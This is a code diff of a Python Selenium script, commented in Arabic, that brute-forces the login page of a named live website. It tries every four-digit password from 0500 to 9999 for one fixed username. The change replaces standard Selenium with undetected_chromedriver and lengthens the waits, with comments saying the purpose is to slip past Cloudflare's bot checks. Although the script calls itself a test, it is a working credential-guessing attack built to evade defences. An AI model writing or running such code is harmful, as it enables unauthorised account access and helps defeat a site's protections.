@@ -1,64 +1,58 @@
 import time
 import os
-from selenium import webdriver
-from selenium.webdriver.chrome.service import Service
+# !! تحديث مهم: استيراد المكتبة الجديدة !!
+import undetected_chromedriver as uc
 from selenium.webdriver.common.by import By
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.common.exceptions import TimeoutException, NoSuchElementException
 
-# --- إعدادات الاختبار ---
+# --- إعدادات الاختبار (تبقى كما هي) ---
 TARGET_URL = "https://menhel-ndb-2.online"
 USERNAME = "33772020"
 PASSWORD_START = 500
 PASSWORD_END = 9999
-
-# رسالة الخطأ التي تظهر عند الفشل
 ERROR_MESSAGE = "خطأ في تسجيل الدخول" 
-
-# --- إعدادات Selenium للخادم (مُحدَّثة) ---
-options = webdriver.ChromeOptions()
-options.add_argument("--headless")
-options.add_argument("--no-sandbox")
-options.add_argument("--disable-dev-shm-usage")
-options.add_argument("--window-size=1920,1080")
-options.add_argument("--disable-gpu")
-
-# !! تحديث مهم: تحديد مسار ملف Chrome التنفيذي !!
-# هذا يخبر Selenium بمكان المتصفح الذي قمنا بتثبيته محليًا
-chrome_path = os.path.join(os.getcwd(), "deps", "chrome-linux64", "chrome")
-options.binary_location = chrome_path
-
-# !! تحديث مهم: تحديد مسار ملف ChromeDriver التنفيذي !!
-chromedriver_path = os.path.join(os.getcwd(), "deps", "chromedriver-linux64", "chromedriver")
-service = Service(executable_path=chromedriver_path)
-
 
 # --- وظيفة الاختبار الرئيسية ---
 def run_brute_force_test():
     driver = None
-    print("--- بدء تشغيل السكربت ---")
+    print("--- بدء تشغيل السكربت باستخدام Undetected Chromedriver ---")
     try:
-        # تهيئة المتصفح مع الخدمة والخيارات المحددة
-        print("1. تهيئة متصفح Chrome...")
-        driver = webdriver.Chrome(service=service, options=options)
+        # !! تحديث مهم: طريقة جديدة لتهيئة المتصفح !!
+        options = uc.ChromeOptions()
+        options.add_argument("--headless")
+        options.add_argument("--no-sandbox")
+        options.add_argument("--disable-dev-shm-usage")
+        
+        # تحديد مسار المتصفح الذي قمنا بتثبيته
+        chrome_path = os.path.join(os.getcwd(), "deps", "chrome-linux64", "chrome")
+        options.binary_location = chrome_path
+        
+        print("1. تهيئة متصفح Chrome المتخفي...")
+        # استخدام uc.Chrome بدلاً من webdriver.Chrome
+        driver = uc.Chrome(options=options, use_subprocess=True)
         
         print(f"2. التوجه إلى الموقع: {TARGET_URL}")
         driver.get(TARGET_URL)
         
-        print("3. الانتظار لمدة 10 ثواني لتحميل الصفحة بالكامل...")
-        time.sleep(10) 
+        print("3. الانتظار لمدة 20 ثانية (لإعطاء وقت لـ Cloudflare)...")
+        time.sleep(20) # زدنا مدة الانتظار لإعطاء فرصة لصفحة التحقق أن تمر
 
         try:
-            WebDriverWait(driver, 15).until(
+            WebDriverWait(driver, 20).until(
                 EC.presence_of_element_located((By.NAME, "auths"))
             )
-            print("4. تم العثور على حقل اسم المستخدم بنجاح. الصفحة جاهزة.")
+            print("4. تم تجاوز الحماية والعثور على حقل اسم المستخدم بنجاح!")
         except TimeoutException:
-            print("!!! فشل التحقق الأولي !!!")
-            print("لم يتم العثور على حقل اسم المستخدم. قد يكون الموقع محجوبًا.")
+            print("!!! فشل التحقق الأولي حتى مع المتصفح المتخفي !!!")
+            print("لم يتم العثور على حقل اسم المستخدم. قد تكون الحماية قوية جدًا.")
+            # حفظ لقطة شاشة للمساعدة في تصحيح الأخطاء
+            driver.save_screenshot('debug_screenshot.png')
+            print("تم حفظ لقطة شاشة باسم debug_screenshot.png")
             return
 
+        # --- بقية الكود (حلقة تجربة كلمات المرور) تبقى كما هي تمامًا ---
         print("5. بدء تجربة كلمات المرور...")
         for i in range(PASSWORD_START, PASSWORD_END + 1):
             password = str(i).zfill(4)
@@ -80,7 +74,6 @@ def run_brute_force_test():
                 
                 if ERROR_MESSAGE not in driver.page_source:
                     print(f"\n*** نجاح! تم تسجيل الدخول بكلمة المرور: {password} ***")
-                    print("سيتم إيقاف السكربت.")
                     break 
                 
             except Exception as e:
